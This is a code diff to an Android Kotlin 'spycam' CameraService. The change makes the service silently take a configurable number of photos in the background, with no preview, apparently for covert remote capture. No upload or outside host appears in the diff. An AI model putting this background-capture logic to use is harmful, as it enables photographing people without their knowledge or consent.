@@ -1,4 +1,4 @@
-package com.spylab.spycam
+package com.spylab.spycam.remote
 
 import android.Manifest
 import android.app.IntentService
@@ -11,11 +11,13 @@ import android.media.ImageReader
 import android.media.ImageReader.OnImageAvailableListener
 import android.os.Handler
 import android.os.HandlerThread
+import android.preference.PreferenceManager
 import android.support.v4.content.ContextCompat
 import android.util.Log
 import android.util.Size
 import android.widget.Toast
 import android.widget.Toast.LENGTH_SHORT
+import com.spylab.spycam.util.ImageSaver
 import java.lang.Thread.sleep
 import java.util.*
 import java.util.concurrent.Semaphore
@@ -24,6 +26,8 @@ import java.util.concurrent.TimeUnit
 
 class CameraService : IntentService("CameraService") {
     private val TAG = "CameraService"
+
+    private var NUMBER_OF_PHOTOS = 3
 
     /**
      * Camera state: Showing camera preview.
@@ -179,23 +183,35 @@ class CameraService : IntentService("CameraService") {
 
     }
 
+    override fun onCreate() {
+        super.onCreate()
+        NUMBER_OF_PHOTOS = PreferenceManager
+                .getDefaultSharedPreferences(this@CameraService)
+                .getString("number_of_photos", "3").toInt()
+    }
+
     override fun onHandleIntent(intent: Intent?) {
         Log.d(TAG, "onHandleIntent")
+        if (intent?.extras?.get("Command") != null)
+            return
         startBackgroundThread()
         takePicture()
     }
 
-    /**
-     * Opens the camera specified by [Camera2BasicFragment.mCameraId].
-     */
-    private fun openCamera(width: Int, height: Int) {
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        Log.d(TAG, "onTaskRemoved")
+        super.onTaskRemoved(rootIntent)
+
+    }
+
+    private fun openCamera() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
 //            requestCameraPermission()
             return
         }
         Log.d(TAG, "openCamera")
 
-        setUpCameraOutputs(width, height)
+        setUpCameraOutputs()
         val manager = this.getSystemService(Context.CAMERA_SERVICE) as CameraManager
         try {
             if (!mCameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
@@ -295,15 +311,19 @@ class CameraService : IntentService("CameraService") {
 //                                        mCaptureCallback, mBackgroundHandler)
                                 Log.d(TAG, "createCameraPreviewSession " + mPreviewRequest)
                                 Log.d(TAG, "createCameraPreviewSession " + mCaptureSession)
-                                lockFocus()
-                                Handler().postDelayed(Runnable {
+
+                                for (i in 0 until NUMBER_OF_PHOTOS) {
                                     lockFocus()
                                     sleep(1000)
-                                    lockFocus()
-//                                    sleep(2000)
-//                                    closeCamera()
-//                                    stopBackgroundThread()
-                                }, 1000)
+                                }
+//                                Handler().postDelayed(Runnable {
+//                                    lockFocus()
+//                                    sleep(1000)
+//                                    lockFocus()
+////                                    sleep(2000)
+////                                    closeCamera()
+////                                    stopBackgroundThread()
+//                                }, 1000)
                             } catch (e: CameraAccessException) {
                                 Log.e(TAG, "err: " + e.message)
                             } catch (e: InterruptedException) {
@@ -323,14 +343,7 @@ class CameraService : IntentService("CameraService") {
         }
     }
 
-
-    /**
-     * Sets up member variables related to camera.
-     *
-     * @param width  The width of available size for camera preview
-     * @param height The height of available size for camera preview
-     */
-    private fun setUpCameraOutputs(width: Int, height: Int) {
+    private fun setUpCameraOutputs() {
         val manager = this.getSystemService(Context.CAMERA_SERVICE) as CameraManager
         try {
             for (cameraId in manager.cameraIdList) {
@@ -353,7 +366,7 @@ class CameraService : IntentService("CameraService") {
                 mSensorOrientation = manager.getCameraCharacteristics(mCameraId).get(
                         CameraCharacteristics.SENSOR_ORIENTATION)
                 mImageReader = ImageReader.newInstance(largest.width, largest.height,
-                        ImageFormat.JPEG, /*maxImages*/2)
+                        ImageFormat.JPEG, /*maxImages*/NUMBER_OF_PHOTOS)
                 mImageReader?.setOnImageAvailableListener(
                         mOnImageAvailableListener, mBackgroundHandler)
 
@@ -385,7 +398,7 @@ class CameraService : IntentService("CameraService") {
      * Initiate a still image capture.
      */
     private fun takePicture() {
-        openCamera(1920, 1080)
+        openCamera()
     }
 
     /**
